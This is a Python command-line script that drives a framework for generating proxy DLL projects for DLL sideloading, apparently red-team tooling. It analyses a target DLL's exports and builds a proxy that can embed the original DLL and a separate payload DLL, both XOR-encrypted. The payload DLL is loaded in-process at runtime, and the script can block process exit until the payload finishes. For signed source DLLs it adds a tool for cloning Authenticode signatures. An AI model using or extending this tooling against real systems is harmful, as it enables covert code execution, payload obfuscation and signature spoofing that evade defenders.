#!/usr/bin/env python3
"""DLL Proxy Framework — Generate proxy DLL projects for sideloading research."""

import argparse
import sys
from pathlib import Path

import pefile

from analyzer import PEAnalyzer
from generator import CodeGenerator
from embedder import ResourceEmbedder
from sigclone import clone_signature


def main():
    parser = argparse.ArgumentParser(
        description='Generate a proxy DLL project from a target DLL.',
        epilog='Example: python generate.py C:\\Windows\\System32\\version.dll --payload --embed',
    )
    parser.add_argument('dll', help='Path to the target DLL to proxy')
    parser.add_argument('-o', '--output', help='Output directory (default: ./output/<name>_proxy/)')
    parser.add_argument('--embed', action='store_true', help='Embed original DLL as a PE resource')
    parser.add_argument('--payload', action='store_true', help='Include payload thread template')
    parser.add_argument('--block', action='store_true', help='Block process exit until payload finishes (implies --payload)')
    parser.add_argument('--payload-dll', metavar='PATH', help='Embed a payload DLL and LoadLibrary it in-process at runtime')
    parser.add_argument('--payload-export', metavar='NAME', help='DLL export to call after loading the payload DLL')
    parser.add_argument('--compiler', choices=['msvc', 'gcc', 'both'], default='both', help='Target compiler (default: both)')
    parser.add_argument('--arch', choices=['x86', 'x64', 'auto'], default='auto', help='Target architecture (default: auto-detect)')
    parser.add_argument('--original-name', help='Runtime filename for original DLL (non-embed mode)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--dry-run', action='store_true', help='Show what would be generated without writing')
    args = parser.parse_args()

    if args.block:
        args.payload = True

    if args.payload_dll:
        args.payload = True

    dll_path = Path(args.dll)
    if not dll_path.exists():
        print(f"[-] Error: DLL not found: {dll_path}", file=sys.stderr)
        sys.exit(1)

    payload_dll_path = None
    if args.payload_dll:
        payload_dll_path = Path(args.payload_dll)
        if not payload_dll_path.exists():
            print(f"[-] Error: Payload DLL not found: {payload_dll_path}", file=sys.stderr)
            sys.exit(1)
        try:
            pe = pefile.PE(str(payload_dll_path), fast_load=True)
            is_dll = bool(pe.FILE_HEADER.Characteristics & 0x2000)
            pe.close()
            if not is_dll:
                print(f"[-] Error: {payload_dll_path} is an EXE, not a DLL", file=sys.stderr)
                sys.exit(1)
        except pefile.PEFormatError:
            print(f"[-] Error: {payload_dll_path} is not a valid PE file", file=sys.stderr)
            sys.exit(1)

        print(f"[+] Payload DLL: {payload_dll_path.name}")

    if args.payload_export and not args.payload_dll:
        print("[!] Warning: --payload-export requires --payload-dll, ignored", file=sys.stderr)
        args.payload_export = None

    # --- Analyze ---
    print(f"[*] Analyzing: {dll_path}")
    analyzer = PEAnalyzer()
    try:
        export_table = analyzer.analyze(dll_path)
    except ValueError as e:
        print(f"[-] Error: {e}", file=sys.stderr)
        sys.exit(1)

    arch = args.arch
    if arch == 'auto':
        arch = 'x64' if export_table.is_64bit else 'x86'
    elif arch == 'x64' and not export_table.is_64bit:
        print("[!] Warning: DLL is x86 but targeting x64", file=sys.stderr)
    elif arch == 'x86' and export_table.is_64bit:
        print("[!] Warning: DLL is x64 but targeting x86", file=sys.stderr)

    print(f"[+] DLL: {export_table.dll_name}")
    print(f"[+] Architecture: {arch} ({'64-bit' if export_table.is_64bit else '32-bit'})")
    print(f"[+] Exports: {len(export_table.exports)} total "
          f"({len(export_table.named_exports)} named, "
          f"{len(export_table.ordinal_only_exports)} ordinal-only, "
          f"{len(export_table.forwarded_exports)} forwarded)")

    if args.verbose:
        for exp in export_table.exports:
            fwd = f" -> {exp.forwarder}" if exp.forwarder else ""
            name = exp.name or f"(ordinal {exp.ordinal})"
            print(f"    @{exp.ordinal:4d}  {name}{fwd}")

    # --- Generate ---
    output_dir = Path(args.output) if args.output else Path('output') / f"{export_table.dll_name_no_ext}_proxy"

    original_dll_filename = args.original_name or f"original_{export_table.dll_name}"
    original_dll_path = original_dll_filename

    payload_bin_filename = "payload_bin.dat"

    generator = CodeGenerator()
    files, xor_key, payload_xor_key = generator.generate(
        export_table,
        embed_enabled=args.embed,
        payload_enabled=args.payload,
        block_enabled=args.block,
        payload_bin_enabled=bool(args.payload_dll),
        payload_bin_filename=payload_bin_filename,
        payload_export=args.payload_export,
        compiler=args.compiler,
        original_dll_filename=original_dll_filename,
        original_dll_path=original_dll_path,
    )

    if args.dry_run:
        print(f"\n[*] Dry run — would generate {len(files)} files in {output_dir}/:")
        for name in sorted(files.keys()):
            print(f"    {name}")
        sys.exit(0)

    # --- Write output ---
    output_dir.mkdir(parents=True, exist_ok=True)
    for filename, content in files.items():
        filepath = output_dir / filename
        filepath.write_text(content, encoding='utf-8')
        if args.verbose:
            print(f"    wrote {filepath}")

    # --- Copy original DLL ---
    embedder = ResourceEmbedder()
    if args.embed:
        copied_name = embedder.copy_original(dll_path, output_dir)
        embedded_path = output_dir / copied_name
        raw = embedded_path.read_bytes()
        encrypted = bytes(b ^ xor_key[i % len(xor_key)] for i, b in enumerate(raw))
        embedded_path.write_bytes(encrypted)
        print(f"[+] Embedded: {dll_path.name} as {copied_name} (encrypted)")
    elif export_table.has_signature:
        copied_name = embedder.copy_original(dll_path, output_dir)
        print(f"[+] Copied {dll_path.name} as {copied_name} (signature source + runtime original)")
    else:
        print(f"[+] Non-embed mode: place original DLL as '{original_dll_path}' alongside the proxy")

    # --- Copy and encrypt payload DLL ---
    if args.payload_dll:
        copied_name = embedder.copy_payload_bin(payload_dll_path, output_dir, payload_bin_filename)
        embedded_path = output_dir / copied_name
        raw = embedded_path.read_bytes()
        encrypted = bytes(b ^ payload_xor_key[i % len(payload_xor_key)] for i, b in enumerate(raw))
        embedded_path.write_bytes(encrypted)
        print(f"[+] Embedded payload: {payload_dll_path.name} as {copied_name} (encrypted)")

    # --- Copy sigclone utility if source DLL is signed ---
    if export_table.has_signature:
        sigclone_src = Path(__file__).parent / 'sigclone' / 'sigclone.py'
        sigclone_dst = output_dir / 'sigclone.py'
        sigclone_dst.write_text(sigclone_src.read_text(encoding='utf-8'), encoding='utf-8')
        print(f"[+] Signature cloner: sigclone.py (source DLL is Authenticode signed)")

    # --- Summary ---
    print(f"\n[+] Generated {len(files) + (1 if export_table.has_signature else 0)} files in: {output_dir.resolve()}")
    print(f"[+] Options: embed={'yes' if args.embed else 'no'}, "
          f"payload={'yes' if args.payload else 'no'}, "
          f"block={'yes' if args.block else 'no'}"
          f"{', payload-dll=' + payload_dll_path.name if args.payload_dll else ''}")

    if args.compiler in ('msvc', 'both'):
        print(f"\n[*] MSVC build: open Developer Command Prompt, cd to output, run build_msvc.bat")
    if args.compiler in ('gcc', 'both'):
        print(f"[*] MinGW build: run 'make' in the output directory")

    if args.payload and not args.payload_dll:
        print(f"\n[*] Edit payload.c to add your loader code, then build.")
    elif args.payload_dll:
        print(f"\n[*] Payload DLL will be LoadLibrary'd in-process at runtime.")
        if args.payload_export:
            print(f"[*] After loading, export '{args.payload_export}' will be called.")


if __name__ == '__main__':
    main()
